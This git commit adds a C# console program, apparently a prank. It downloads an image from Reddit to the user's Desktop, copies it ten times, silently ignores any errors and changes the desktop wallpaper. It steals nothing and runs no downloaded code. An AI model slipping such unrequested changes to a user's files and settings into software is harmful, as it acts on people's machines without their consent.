816b38a3bd9c2ddbf6dfb0ee3382e1d71e03ba0b
Jonathan <72880844+ZENXDotPY@users.noreply.github.com>
2021-11-16 22:22:52 +0100

    Initial commit

---
+++ BallsConsole/Program.cs
@@ -0,0 +1,44 @@
+﻿using System;
+using System.IO;
+using System.Net;
+using BallsConsole.Functions;
+
+namespace BallsConsole
+{
+    class Program
+    {
+
+        static void Main(string[] args)
+        {
+
+            string desktop = @"C:\Users\" + Environment.UserName + @"\Desktop\";
+            string localFilename = @"C:\Users\" + Environment.UserName + @"\Desktop\balls.jpg";
+
+            try
+            {
+                using (WebClient client = new WebClient())
+                {
+                    client.DownloadFile("https://i.redd.it/41ps5f0pnt771.png", localFilename);
+                }
+                for (int i = 0; i < 10; i++)
+                {
+                    string num = desktop + i.ToString() + ".jpg";
+                    File.Copy(localFilename, num);
+
+                    Console.WriteLine("Ball " + num);
+                }
+
+
+            }
+
+            catch
+            {
+
+            }
+
+            Wallpaper.changeWallpaper();
+            
+        }
+    }
+
+}
